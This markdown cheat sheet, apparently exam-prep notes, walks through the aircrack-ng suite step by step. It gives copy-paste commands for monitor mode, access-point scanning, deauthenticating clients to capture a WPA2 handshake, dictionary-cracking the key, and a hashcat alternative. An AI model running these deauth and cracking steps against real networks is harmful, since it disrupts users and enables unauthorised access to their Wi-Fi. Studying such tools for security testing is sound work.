# aircrack-ng — WPA/WPA2 cracking suite

> **The wireless domain tool.** If the exam asks you to crack a Wi-Fi password, recover a WPA key from a pcap, or enumerate nearby APs, this suite is the answer. The suite is 5+ binaries that chain together.

**Install check (Parrot — already installed):** `aircrack-ng --help | head -3`

---

## 🎯 Cheat-flow: full WPA2 crack in one page

| Step | Command | What happens |
|---|---|---|
| 1. Put iface in **monitor mode** | `sudo airmon-ng start wlan0` | Creates `wlan0mon` |
| 2. Kill interfering processes | `sudo airmon-ng check kill` | NM/wpa_supp off |
| 3. **Scan** for APs + clients | `sudo airodump-ng wlan0mon` | Note BSSID, CH, ESSID |
| 4. Focus on one AP, start capture | `sudo airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0mon` | Waits for handshake |
| 5. **Deauth** a client to force reconnect | `sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon` | Client reassociates → 4-way handshake |
| 6. Confirm handshake captured | Top-right of airodump says `WPA handshake: <BSSID>` | Or filter `eapol` in Wireshark |
| 7. **Crack** with a wordlist | `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> handshake-01.cap` | Dictionary attack |
| 8. Stop monitor mode when done | `sudo airmon-ng stop wlan0mon` | Restore managed mode |

---

## 🔑 The 5 binaries you must know

| Tool | Job |
|---|---|
| `airmon-ng` | Enable/disable monitor mode on a wireless NIC |
| `airodump-ng` | Scan 802.11, capture packets/handshakes to pcap |
| `aireplay-ng` | Inject frames (deauth, fake auth, ARP replay) |
| `aircrack-ng` | Crack WEP / WPA / WPA2 from a capture file |
| `airbase-ng` | Create a fake AP (evil twin) |

---

## 🔑 airmon-ng — monitor mode

| Command | Meaning |
|---|---|
| `sudo airmon-ng` | List wireless interfaces |
| `sudo airmon-ng check` | Show interfering processes |
| `sudo airmon-ng check kill` | **Kill them** (NetworkManager, wpa_supplicant) |
| `sudo airmon-ng start wlan0` | Enable monitor mode → creates `wlan0mon` |
| `sudo airmon-ng stop wlan0mon` | Disable monitor mode |

Check manually: `iwconfig wlan0mon` should show `Mode:Monitor`.

---

## 🔑 airodump-ng — scanning & capture

| Flag | Meaning |
|---|---|
| (no flags) `wlan0mon` | Scan all channels, all APs |
| `-c <channel>` | Lock to one channel |
| `--bssid <MAC>` | Filter to one AP |
| `-w <prefix>` | Write to `<prefix>-01.cap` (and .csv, .kismet.csv) |
| `--band abg` | 2.4 + 5 GHz |
| `-d <MAC>` | Filter by destination MAC |
| `--encrypt WPA2` | Filter by encryption type |

### Reading the airodump screen
Top half = APs:
- **BSSID** — AP's MAC
- **PWR** — signal strength
- **CH** — channel
- **ENC / CIPHER / AUTH** — WEP / WPA / WPA2, CCMP, PSK
- **ESSID** — network name

Bottom half = stations (clients) associated with those BSSIDs. Pick a client MAC for the deauth.

---

## 🔑 aireplay-ng — injection

| Attack | Command | Meaning |
|---|---|---|
| **Deauth (broadcast)** | `aireplay-ng -0 5 -a <BSSID> wlan0mon` | Kick everyone |
| **Deauth (targeted)** | `aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon` | Kick one client (safer, gets handshake) |
| Fake auth (WEP) | `aireplay-ng -1 0 -a <BSSID> -h <MYMAC> wlan0mon` | Associate with AP |
| ARP replay (WEP) | `aireplay-ng -3 -b <BSSID> -h <MYMAC> wlan0mon` | Generate IVs |
| Injection test | `aireplay-ng --test wlan0mon` | Verify card can inject |

`-0` = deauth mode. `5` = number of deauth packets. `0` = infinite.

---

## 🔑 aircrack-ng — the cracker

| Flag | Meaning |
|---|---|
| `-w <wordlist>` | Dictionary file (e.g. `/usr/share/wordlists/rockyou.txt`) |
| `-b <BSSID>` | Target AP's MAC |
| `-e <ESSID>` | Target by name |
| `-a 2` | Force WPA mode (1 = WEP) |
| `<file.cap>` | Capture with handshake |

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
```

Success prints `KEY FOUND! [ password123 ]`.

---

## 📋 Command recipes (copy-paste)

```bash
# FULL WPA2 CRACK FLOW -----------------------------------

# 1. Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Scan
sudo airodump-ng wlan0mon
# (Ctrl-C once you've noted BSSID, CH, a connected CLIENT MAC)

# 3. Targeted capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# 4. In a second terminal: deauth to trigger handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. Watch the airodump window — top right should show:
#    "WPA handshake: AA:BB:CC:DD:EE:FF"
#    Verify in Wireshark:
wireshark handshake-01.cap &   # filter: eapol  (need all 4 messages)

# 6. Crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# 7. Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager

# ONE-OFFS ----------------------------------------------

# Just enumerate APs
sudo airodump-ng wlan0mon

# Crack a pre-captured handshake given to you in the exam
aircrack-ng -w /usr/share/wordlists/rockyou.txt given.cap

# WEP key recovery (legacy)
aircrack-ng -a 1 -b <BSSID> wep-capture-01.cap
```

---

## ⚠️ Gotchas

- **Monitor mode is mandatory.** You cannot sniff 802.11 mgmt frames in managed mode. Verify with `iwconfig`.
- **Kill NetworkManager first** (`airmon-ng check kill`) or it will constantly reset your card.
- **Channel must match** — airodump has to be locked to the AP's channel (`-c`) when you deauth or you'll miss the handshake.
- **Handshake completeness** — aircrack needs all 4 EAPOL messages. If it says "No valid WPA handshakes found," re-deauth and recheck in Wireshark with filter `eapol`. See [wireshark](wireshark.md).
- **Targeted deauth** (`-c <client>`) is more reliable than broadcast — broadcast deauths sometimes don't reach hidden stations.
- **rockyou.txt location:** `/usr/share/wordlists/rockyou.txt`. If it's gzipped: `gunzip /usr/share/wordlists/rockyou.txt.gz`.
- **Password must be in the wordlist.** aircrack is a dictionary attack, not brute force. If exam WPA password is `MyC00lWiFi!`, it's in rockyou.
- **Interface naming:** on some systems `airmon-ng start wlan0` leaves the iface as `wlan0` (just in monitor mode) instead of creating `wlan0mon`. Check with `iwconfig`.
- **5 GHz** needs `--band a` and a card that supports it (most exam cards are 2.4 GHz only).
- **hashcat alternative:** convert with `hcxpcapngtool -o hash.hc22000 handshake-01.cap` then `hashcat -m 22000 hash.hc22000 rockyou.txt` — faster on GPU.

---

## 🔗 Related

- [wireshark](wireshark.md) — verify `eapol` handshake completeness
- [bettercap](bettercap.md) — alternative wireless + network attack framework
- [16-wireless domain README](../16-wireless/README.md)
- [Wireless playbook](../playbooks/wireless-playbook.md)
